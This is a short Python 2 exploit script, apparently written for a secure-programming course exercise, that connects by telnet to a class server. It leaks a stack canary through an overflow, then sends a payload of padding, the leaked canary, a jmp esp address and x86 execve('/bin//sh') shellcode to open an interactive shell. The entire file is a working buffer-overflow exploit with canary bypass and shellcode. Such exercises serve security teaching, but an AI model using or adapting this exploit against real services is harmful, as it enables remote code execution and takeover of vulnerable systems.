# Echo client program
import telnetlib
import sys 

# The remote host
HOST = 'secprog.cs.nctu.edu.tw' 
PORT = 10103

tn = telnetlib.Telnet(HOST,PORT)
tn.write('a'*12+"\n")
message = tn.read_until('\n')
sys.stdout.write(message)
guard = tn.read_until('\n')
guard = list(guard)
print guard

canary = '\x00' + guard[0] + guard[1] + guard[2]
jmp_esp = "\xd0\x86\x04\x08"
shellcode = "\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"

payload = 'a'*12 + canary + '\xaa'*8 + "$ebp" + jmp_esp + shellcode + '\n'
print payload
tn.write(payload)
tn.interact()
